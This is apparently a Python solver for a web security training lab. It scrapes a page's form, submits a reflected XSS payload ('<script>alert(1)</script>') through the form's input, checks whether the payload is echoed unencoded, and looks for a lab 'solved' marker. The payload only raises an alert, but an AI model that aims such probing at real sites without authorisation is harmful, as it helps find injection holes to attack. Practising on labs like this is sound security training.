import requests
from bs4 import BeautifulSoup

input_url = str(input("Enter the Target URL: "))
payload = "<script>alert(1)</script>"

"""
<section class=search>
    <form action=/ method=GET> 
        <input type=text placeholder='Search the blog...' name=search>
            <button type=submit class=button>Search</button>
    </form>
</section>

"""


with requests.session() as s:
    resp = s.get(url=input_url)

    soup = BeautifulSoup(resp.text , 'html.parser')

    find_form = soup.find('form') # This searches for form tag in the HTML 
    print(find_form)

    #Next we search in the form we got from HTML 

    find_action = find_form['action'] #where it goes laburl + /
    print(find_action)

    find_param = find_form.find('input')['name']
    print(find_param)

    
    # Send the Payload
    url_payload = {find_param:payload}
    sendit = s.get(url=input_url , params=url_payload)
    print(sendit.url)

    #checks if input reflected without encoding

    soup2 = BeautifulSoup(sendit.text , 'html.parser')

    if payload in sendit.text:
        print("found")
    
    # Checks if solved or not
    
    solved = s.get(url=input_url)
    soup3 = BeautifulSoup(solved.text, 'html.parser')

    final_msg = soup3.find(class_ = 'is-solved')

    if final_msg:
        print("lab solved")